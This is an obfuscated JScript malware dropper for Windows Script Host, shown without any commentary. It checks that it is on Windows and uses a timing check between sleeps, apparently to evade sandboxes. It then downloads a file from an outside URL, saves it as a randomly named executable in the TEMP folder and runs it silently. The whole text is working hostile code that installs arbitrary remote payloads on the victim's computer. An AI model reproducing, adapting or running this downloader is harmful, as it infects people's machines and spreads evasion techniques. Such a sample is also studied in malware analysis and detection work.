var _SC = false;
var _PO = "CreateObject";
var _M0 = function _H() {return WScript[_PO]("WScript"+".Shell");}(), _QZ = 11;
var _G = "MSXML2.XMLHTTP";
var _J = 2123213;
var _R0 = 0;
function _VA(_F){_M0["Run"](_F, _R0, _R0);};
function _D(){return _G + "";};
function _X0(_JZ, _I){_R0 = _R0 * 1; return _JZ - _I;};
function _L(){return _PO;};
/*@cc_on
  @if (@_win32 || @_win64)
    _SC = true;
  @end
@*/
if (_SC)
{
var _D0 = "";
function _W(){return 22;};
var _L0 = 0; var _MK = 0;
function _DR()
{
var _AP = new this["Date"]();
var _X1 = _AP["getUTCMilliseconds"]();
WScript["Sleep"](_W());
var _AP = new this["Date"]();
var _AB = _AP["getUTCMilliseconds"]();
WScript["Sleep"](_W());
var _AP = new this["Date"]();
var _W1 = _AP["getUTCMilliseconds"]();
var _L0 = "_XV";
_L0 = _X0(_AB, _X1);
var _MK = "_IU";
_MK = _X0(_W1, _AB);
_D0 = "open";
return _X0(_L0, _MK);
}
var _ON = false;
var _BF = false;
for (var _UC = _R0; _UC < _W() * 1; _UC++){if (_DR() != _R0){
_ON = true; 
_MK = "31" + 11 * _L0 + _MK; 
_BF = true; 
break;
}}
function _S() {return ((_ON == true) && (_ON == _BF)) ? 1 : _R0;};
if (_ON && _S() && _BF){
function _X() {return _M0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "G04F803oINd1rKFg.ex" + "e";};
 _U = _D();
 _JU = WScript[_PO](_U);
 var _M = 1;
 while (_M){
try {
	if (_M == 1)
	{
		_JU[_D0]("GET", "http://hollandfoodexchange.com/d7jsa", false);
		_JU["send"]();
		_P0 = "Sleep";
	}
	WScript[_P0](_W() + 120); 
	if (_JU["readystate"] < 2 * 2) continue;
	_M = _R0;
	function _P(_V) {var _W0 = (1, 2, 3, 4, 5, _V); return _W0;};
	_TU = WScript[_L()]("ADODB.Stream");
	_U = _TU;
	_U[_D0]();
	_U["type"] = _P(1);
	_U["write"](_JU["ResponseBody"]);
	_TU["position"] = _P(_R0);
	_U["Save" + "ToFile"](_X(), 2);
	_TU["cl"+"ose"]();
	_R = _X();
	_VA(_R);
} catch(_PC){};
}
}
}

